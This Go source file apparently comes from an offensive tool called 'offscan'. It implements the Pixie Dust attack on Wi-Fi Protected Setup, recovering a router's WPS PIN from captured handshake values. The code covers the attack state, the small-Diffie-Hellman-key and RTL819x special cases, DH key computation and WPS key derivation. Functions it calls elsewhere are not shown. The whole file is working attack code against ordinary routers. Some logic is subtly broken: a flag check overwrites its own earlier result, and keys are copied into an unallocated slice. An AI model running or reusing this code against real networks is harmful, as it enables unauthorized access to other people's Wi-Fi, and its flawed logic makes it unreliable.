/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"math/big"
	"net"
	"offscan/internal/utils"
	"slices"
	"time"
)



type pixieDustAttack struct {
    timeExec    time.Time
    firstHalf   int
    secondHalf  int
    emptyPin    bool
	jobs        int
	pke         []byte
	pkr         []byte
	eHash1      []byte
	eHash2      []byte
	authKey     []byte
	eNonce      []byte
	rNonce      []byte
	ebssid      net.HardwareAddr
	modes       []uint8
    auto        bool
    isRTL819x   bool
	m5enc       []byte
	m7enc       []byte
	force       bool
	dhSmall     bool
	start       int64
	end         int64
	cStart      int
	cEnd        int
    emsk        []byte
    wrapKey     []byte
    psk1        []byte
    psk2        []byte
    emptyPsk    []byte
    kdk         []byte
    dhKey       []byte
    decrypted5  []byte
    decrypted7  []byte
    eSecret1    []byte
    eSecret2    []byte
    nonceSeed   uint32
    s1Seed      uint32
    s2Seed      uint32
    foundMode   uint8
}



func newPixieDust(args []string) pixieDustAttack {
	pda := pixieDustAttack{}
	pda.parseArgs(args)
	return pda
}



func (pda *pixieDustAttack) execute() {
	pda.timeExec = time.Now()
    pda.checkRTL819xPKE()
    pda.executeRTL819xCase() // it stops here if executed
    pda.validDHSmallFlag()
    pda.checkSmallDHKeys()
    pda.validRequiredFlags()
    pda.validDates()
    pda.setModes()
    pda.displayModes()
    pda.setTimeRange()
    pda.setDHSmall()
    pda.computeAuthKey()
    pda.setKDK()
    pda.kdf()
    pda.emptyPinHMAC()
    pda.trySpecialCases()   // it stops here if true
    pda.displayTime()
}



func (pda *pixieDustAttack) checkSmallDHKeys() {
    lenPkr := len(pda.pkr)

    if lenPkr != wpsPkeyLen {
        pda.dhSmall = false
    }

    for i := 0; i < lenPkr - 1; i++ {
        if pda.pkr[i] != 0 {
            pda.dhSmall = false
        }
    }

    pda.dhSmall = pda.pkr[lenPkr - 1] == 0x02
}



func (pda *pixieDustAttack) setModes() {
    if !pda.auto { return }

    if pda.isRTL819x {
        pda.modes = append(pda.modes, rtl819x)
        return
    }

    pda.modes = append(pda.modes, rt)

    if pda.isGlibc() {
        pda.modes = append(pda.modes, rtl819x)
    }

    pda.modes = append(pda.modes, eCosSimple)
}



func (pda *pixieDustAttack) setDHSmall() {
    if pda.dhSmall && pda.pkr == nil {
        pda.pkr = make([]byte, wpsPkeyLen)
        pda.pkr[wpsPkeyLen-1] = 0x02
    }
}



func (pda *pixieDustAttack) computeAuthKey() {
    if pda.authKey != nil { return }

    if pda.dhSmall {
        key := sha256.Sum256(pda.pke)
        copy(pda.dhKey, key[:])
    
    } else if pda.isRTL819x {
        pda.computeDHKey()
    }
}



func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
	return slices.Contains(pda.modes, mode)
}



func (pda *pixieDustAttack) computeDHKey() {
    eKey := bytes.Repeat([]byte{0x55}, 192)
	
    sharedSecret, err := cryptoModExp(pda.pkr, eKey, dhGroup5Prime)
    if err != nil {
        utils.Abort(fmt.Sprintf("%v", err))
    }

    key := sha256.Sum256(sharedSecret)
    copy(pda.dhKey, key[:])
}



func cryptoModExp(base, power, modulus []byte) ([]byte, error) {
    b := new(big.Int).SetBytes(base)
    e := new(big.Int).SetBytes(power)
    m := new(big.Int).SetBytes(modulus)

    if m.Sign() == 0 || m.Cmp(big.NewInt(1)) == 0 {
        return nil, errors.New("Modulus must be greater than 1")
    }

    result := new(big.Int).Exp(b, e, m)

    return result.Bytes(), nil
}



func (pda *pixieDustAttack) setKDK() {
    h := hmac.New(sha256.New, pda.dhKey)
    
    h.Write(pda.eNonce)
    h.Write(pda.ebssid)
    h.Write(pda.rNonce)

    pda.kdk = h.Sum(nil)
}



// Key Derivation Function
func (pda *pixieDustAttack) kdf() {
	var kdfSalt  = []byte("Wi-Fi Easy and Secure Key Derivation")
    totalLen    := wpsAuthkeyLen + wpsKeywrapkeyLen + wpsEmskLen // 80 bytes
    kdkBits     := uint32(totalLen * 8)  // 640 bits
    out         := make([]byte, 0, totalLen)
   
    for i := 1; len(out) < totalLen; i++ {
        h := hmac.New(sha256.New, pda.kdk)
        binary.Write(h, binary.BigEndian, uint32(i))
        
        h.Write(kdfSalt)
        binary.Write(h, binary.BigEndian, kdkBits)
        
        out = append(out, h.Sum(nil)...)
    }

    out = out[:totalLen]
	
	offset      := 0
    pda.authKey  = out[:wpsAuthkeyLen]
	
	offset      += wpsAuthkeyLen
    pda.wrapKey  = out[offset : offset + wpsKeywrapkeyLen]
	
	offset  += wpsKeywrapkeyLen
    pda.emsk = out[offset:]
}



func (pda *pixieDustAttack) emptyPinHMAC() {
    h := hmac.New(sha256.New, pda.authKey)
    pda.emptyPsk = h.Sum(nil)
}



func (pda *pixieDustAttack) pinFound() bool {
    return pda.firstHalf != -1 || pda.secondHalf != -1
}